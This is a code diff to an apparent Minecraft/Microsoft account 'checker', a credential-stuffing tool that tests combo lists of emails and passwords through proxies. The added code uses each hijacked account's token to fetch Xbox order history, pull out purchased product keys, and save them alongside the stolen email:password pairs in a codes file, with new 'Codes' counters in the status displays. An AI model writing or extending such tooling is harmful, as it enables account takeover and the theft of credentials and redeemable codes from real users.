@@ -28,7 +28,7 @@ Combos = []
 proxylist = []
 banproxies = []
 fname = ""
-hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other,balance = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other,balance,codes = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
 urllib3.disable_warnings()
 warnings.filterwarnings("ignore")
 
@@ -377,11 +377,23 @@ def capture_mc(access_token, session, email, password, type):
             continue
 
 def checkmc(session, email, password, token):
-    global retries, bedrock, cpm, checked, xgp, xgpu, other, balance  # Add balance to globals
+    global retries, bedrock, cpm, checked, xgp, xgpu, other, balance, codes  # Add codes to globals
     while True:
         checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
         if checkrq.status_code == 200:
-            # Check Microsoft balance
+            # Check for purchased codes
+            try:
+                codes_rq = session.get('https://purchase.mp.microsoft.com/v7.0/orders/xboxorders', headers={'Authorization': f'Bearer {token}'}, verify=False)
+                if codes_rq.status_code == 200:
+                    codes_data = codes_rq.json()
+                    for order in codes_data.get('orderHistoryItems', []):
+                        if 'productKey' in order:
+                            code_info = f"{order.get('productTitle', 'Unknown')} | Code: {order['productKey']}"
+                            if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"Code Found: {email}:{password} | {code_info}")
+                            with open(f"results/{fname}/codes.txt", 'a') as f:
+                                f.write(f"{email}:{password} | {code_info}\n")
+            except: pass
+            # Check Microsoft balance (existing code)
             try:
                 balancerq = session.get('https://account.microsoft.com/billing/payments', headers={'Authorization': f'Bearer {token}'}, verify=False)
                 if balancerq.status_code == 200:
@@ -532,7 +544,7 @@ def logscreen():
     global cpm, cpm1
     cmp1 = cpm
     cpm = 0
-    utils.set_title(f"Modified By 8H3 | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Balance: {balance}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
+    utils.set_title(f"Modified By 8H3 | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Balance: {balance}  -  Codes: {codes}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
     time.sleep(1)
     threading.Thread(target=logscreen).start()
 
@@ -552,6 +564,7 @@ def cuiscreen():
     print(f" [{xgp}] Xbox Game Pass")
     print(f" [{xgpu}] Xbox Game Pass Ultimate")
     print(f" [{balance}] Balance Accounts")
+    print(f" [{codes}] Codes")
     print(f" [{other}] Other")
     print(f" [{vm}] Valid Mail")
     print(f" [{retries}] Retries")
@@ -574,6 +587,7 @@ def finishedscreen():
     print("Xbox Game Pass: "+str(xgp))
     print("Xbox Game Pass Ultimate: "+str(xgpu))
     print("Balance Accounts: "+str(balance))
+    print("Codes: "+str(codes))
     print("Other: "+str(other))
     print("Valid Mail: "+str(vm))
     print(Fore.LIGHTRED_EX+"Press any key to exit.")
